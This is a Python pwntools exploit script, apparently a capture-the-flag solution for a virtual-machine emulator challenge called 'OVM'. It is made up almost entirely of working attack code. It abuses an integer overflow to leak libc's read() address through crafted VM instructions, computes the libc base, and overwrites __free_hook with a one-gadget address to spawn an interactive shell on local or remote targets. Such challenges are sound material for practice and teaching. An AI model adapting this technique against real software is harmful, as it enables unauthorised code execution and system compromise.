import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28879)
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		#integer overflow 0x400F8 / 0x4 = 0x1003E = 0xFFFFFFC2
		read_offset = libc.symbols['read']
		__free_hook_offset = libc.symbols['__free_hook']
		system_offset = libc.symbols['system']
		offset1 = __free_hook_offset - read_offset

		io.sendlineafter('PC: ','0')
		io.sendlineafter('SP: ',str(-0x3a))
		code=[
		0x100D0000,
		0x10010001,
		0x700D010D,
		0x10010008,
		0xC00D0D01,
		0xC00D0D01,
		0x1001003E,
		0x700D010D,
		0x10010000,
		0x800D010D,
		0x60030000,
		0x60040000,
		0x10020008,
		0x10010000 + ((offset1 >> 8) % 0x100),
		0x10060000 + (offset1 >> 16),
		0xC0060602,
		0x70060106,
		0xC0060602,
		0x10010000 + (offset1 % 0x100),
		0x70060106,
		0x70050406,
		0x10070008,
		0x80070807,
		0x40050007,
		0x10070007,
		0x80070807,
		0x40030007,
		0xFF000000
		]
		io.sendlineafter("CODE SIZE:",str(len(code)))
		# gdb.attach(io)
		# pause()
		for i in code :
			sleep(0.1)
			io.sendline(str(i))



		io.recvuntil("R3: ")
		read = int(io.recv(4),16) << 32
		io.recvuntil("R4: ")
		read = read + int(io.recvuntil("\nR5:",True),16)
		libc = read - libc.symbols['read'] 
		io.sendafter("HOW DO YOU FEEL AT OVM?",p64(libc + 0x4526a))


		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue